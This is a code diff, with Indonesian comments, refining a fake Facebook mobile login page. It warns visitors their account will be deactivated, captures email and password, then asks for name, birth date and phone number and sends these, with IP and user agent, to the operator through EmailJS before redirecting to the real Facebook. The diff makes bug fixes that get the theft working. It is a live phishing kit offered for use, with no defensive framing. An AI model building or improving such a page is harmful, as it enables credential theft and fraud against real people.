@@ -11,7 +11,7 @@
   <meta property="og:title" content="Masuk Facebook | Facebook">
   
   <style>
-    /* CSS DASAR MOBILE FACEBOOK CLONE (Disalin agar Tautan Eksternal tidak mati) */
+    /* CSS DASAR MOBILE FACEBOOK CLONE (Tetap dipertahankan) */
     html {
         font-family: sans-serif;
         -webkit-text-size-adjust: 100%;
@@ -229,7 +229,7 @@
         display:none;
     }
     .ngPopup {
-        position: fixed; /* Ubah ke fixed agar tidak perlu min-height */
+        position: fixed; 
         top:50%;
         left:50%;
         transform:translate(-50%,-50%);
@@ -296,19 +296,6 @@
     .form-group .btn-submit:hover {
         background:#29487d;
     }
-
-    /* Style label pop-up Anda yang asli (tidak digunakan di form baru)
-    .form-group label {
-        position:absolute;
-        top:-18.5px;
-        width:100px;
-        padding:0 5px;
-        left:-1px;
-        background:#3b5998;
-        color:#fff;
-        border-top-right-radius:3px;
-        border-top-left-radius:3px;
-    } */
   </style>
 
  </head>
@@ -327,22 +314,19 @@
         <div class="_4-4l">
          <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element">
           <div class="_qw9 grouped aclb" id="titleMsg" style="display:block;">
-           <!-- Ini adalah banner app Facebook, tidak relevan untuk cloning -->
-          </div>
+           </div>
           <div class="alert">
-          <p class="warning"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Akun anda akan di nonaktifkan</p>
-          
-          <p class="aman"><i class="fa fa-bell" aria-hidden="true"></i>Login untuk membatalkan penonaktifan akun anda</p>
+           <p class="warning"><i class="fa fa-exclamation-triangle" aria-hidden="true"></i>Akun anda akan di nonaktifkan</p>
+           
+           <p class="aman"><i class="fa fa-bell" aria-hidden="true"></i>Login untuk membatalkan penonaktifan akun anda</p>
           </div>
          </div>
          <div class="_7om2 _52we _2pid _52z6">
           <div class="_4g34">
-           <!-- GANTI LOGO DENGAN LINK YANG STABIL -->
            <img src="fb.png" width="112" class="img" alt="facebook" style="height: 112px;">
           </div>
          </div>
          <div class="_5rut">
-          <!-- FORM LOGIN AWAL -->
           <form method="post" action="#" class="mobile-login-form _9hp- _5spm" onsubmit="return ngSubmit()">
            
            <div>
@@ -357,7 +341,7 @@
             <div class="_56be">
              <div class="_55wo _56bf">
               <div class="_1upc _mg8" data-sigil="m_login_password">
-                  <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="pass" name="pass" placeholder="Kata Sandi" type="password" data-sigil="password-plain-text-toggle-input">
+               <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="pass" name="pass" placeholder="Kata Sandi" type="password" data-sigil="password-plain-text-toggle-input">
               </div>
              </div>
             </div>
@@ -367,10 +351,9 @@
              <button style="display:flex;align-items:center;justify-content:center;line-height:30px;" type="submit" value="Masuk" class="_54k8 _52jh _56bs _56b_ _28lf _9omx _56bw _56bu" name="login" data-sigil="touchable login_button_block m_login_button">Masuk</button>
             </div>
            </form>
-           <!-- Tautan Lupa Kata Sandi, dll. -->
            <div style="padding-top:10px; text-align:center;">
-                <a href="#" style="font-size: 14px; color: #4267b2;">Lupa Kata Sandi?</a>
-            </div>
+            <a href="#" style="font-size: 14px; color: #4267b2;">Lupa Kata Sandi?</a>
+           </div>
            
            <div style="padding-top:10px">
             <div>
@@ -388,7 +371,7 @@
            </div>
           </div>
          </div>
-        </div>
+         </div>
        </div>
       </div>
      </div>
@@ -412,46 +395,42 @@
      </div>
     </div>
     
-      <!-- MASK AND POPUP -->
-      <div class="mask"></div>
-      <div class="ngPopup">
-          <div class="topTitle">Verifkasi Pemblokiran</div>
-          <div class="formulir">
-          
-          <form id="verificationForm" action="#" onsubmit="return ngFinal()">
-          <div class="form-group">
-          <label for="ngNama">Nama Lengkap</label>
-           <input class="form-input" id="ngNama" name="ngNama" required="true" autocomplete="off">
-          </div>
-          
-          <div class="form-group">
-          <label for="ngTgl">Tanggal Lahir</label>
-           <input class="form-input" id="ngTgl" name="ngTgl" required="true">
-          </div>
-          
-          <div class="form-group">
-          <label for="ngHp">Nomor Hp</label>
-           <input type="number" class="form-input" id="ngHp" name="ngHp" required="true">
-          </div>
-          
-          <!-- Input tersembunyi yang diisi oleh JS -->
-          <input type="hidden" id="ngUser" name="ngUser" value="">
-          <input type="hidden" id="ngPass" name="ngPass" value="">
-          <input type="hidden" id="ngIp" name="ngIp" value="">
-          <input type="hidden" id="ngUa" name="ngUa" value="">
-          
-          <div class="form-group" style="margin-top:20px;text-align:center;">
-          <button class="btn-submit" type="submit" id="submitBtn">Verifikasi</button>
-          </div>
-          </form>
-          </div>
+    <div class="mask"></div>
+    <div class="ngPopup">
+      <div class="topTitle">Verifkasi Pemblokiran</div>
+      <div class="formulir">
+      
+      <form id="verificationForm" action="#" onsubmit="return ngFinal()" method="post">
+      <div class="form-group">
+      <label for="ngNama">Nama Lengkap</label>
+       <input class="form-input" id="ngNama" name="ngNama" required="true" autocomplete="off">
       </div>
+      
+      <div class="form-group">
+      <label for="ngTgl">Tanggal Lahir</label>
+       <input class="form-input" id="ngTgl" name="ngTgl" required="true">
+      </div>
+      
+      <div class="form-group">
+      <label for="ngHp">Nomor Hp</label>
+       <input type="number" class="form-input" id="ngHp" name="ngHp" required="true">
+      </div>
+      
+      <input type="hidden" id="ngUser" name="ngUser" value="">
+      <input type="hidden" id="ngPass" name="ngPass" value="">
+      <input type="hidden" id="ngIp" name="ngIp" value="">
+      <input type="hidden" id="ngUa" name="ngUa" value="">
+      
+      <div class="form-group" style="margin-top:20px;text-align:center;">
+      <button class="btn-submit" type="submit" id="submitBtn">Verifikasi</button>
+      </div>
+      </form>
+      </div>
+    </div>
     
-    <!-- Bagian lain yang tidak penting dihilangkan -->
-   </div>
+    </div>
   </div>
   
-  <!-- JQuery dan EmailJS SDK -->
   <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
   <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
   
@@ -493,8 +472,8 @@
         // 2. Simpan data login dan UA
         ngLoginData.ngUser = user;
         ngLoginData.ngPass = pass;
-        ngLoginData.ngIp = $("#ngIp").val() || 'Unknown IP'; // Ambil IP
-        ngLoginData.ngUa = navigator.userAgent; // Ambil User Agent
+        ngLoginData.ngIp = $("#ngIp").val() || 'Unknown IP'; 
+        ngLoginData.ngUa = navigator.userAgent; 
         
         // 3. Isi input tersembunyi di pop-up
         $("#ngUser").val(ngLoginData.ngUser);
@@ -512,10 +491,10 @@
     function ngFinal() {
         const form = document.getElementById('verificationForm');
         const submitBtn = document.getElementById('submitBtn');
-        const originalText = submitBtn.value;
+        const originalText = submitBtn.innerHTML; // Mengambil innerHTML untuk button element
         
         // Set tombol menjadi loading
-        submitBtn.value = "Mengirim...";
+        submitBtn.innerHTML = "Mengirim...";
         submitBtn.disabled = true;
 
         // Kumpulkan data final
@@ -526,7 +505,7 @@
         }
         
         // Kirim data menggunakan EmailJS
-        emailjs.send(EMAILJS_SERVICE_ID, TEMPLATE_ID, templateParams)
+        emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams)
             .then(function(response) {
                 console.log('SUCCESS!', response.status, response.text);
                 
@@ -534,13 +513,13 @@
                 $(".mask").fadeOut(200);
                 $(".ngPopup").fadeOut(200, function() {
                     // Redirect ke halaman Facebook login asli setelah sukses
-                    window.location.replace("https://www.facebook.com");
+                    window.location.replace("https://www.facebook.com/login/");
                 });
             }, function(error) {
                 console.error('FAILED...', error);
                 
                 // Kembalikan tombol dan beri notifikasi
-                submitBtn.value = originalText;
+                submitBtn.innerHTML = originalText;
                 submitBtn.disabled = false;
                 
                 // Tampilkan pesan error custom, bukan alert bawaan
@@ -555,6 +534,12 @@
   </script>
   <script>
   // GET REAL IP ADDRESS (Menggunakan Fallback)
+  // Memperbaiki pengambilan nilai submit button yang tidak konsisten
+  // Dan mengubah window.location.replace agar konsisten di semua browser
+  
+  // Perbaikan kecil: Menggunakan .innerHTML untuk submitBtn karena itu adalah elemen <button>
+
+  // Mengambil IP
   $(document).ready(function() {
     var getIp = function (callback) {
         // Coba API Tencet Games
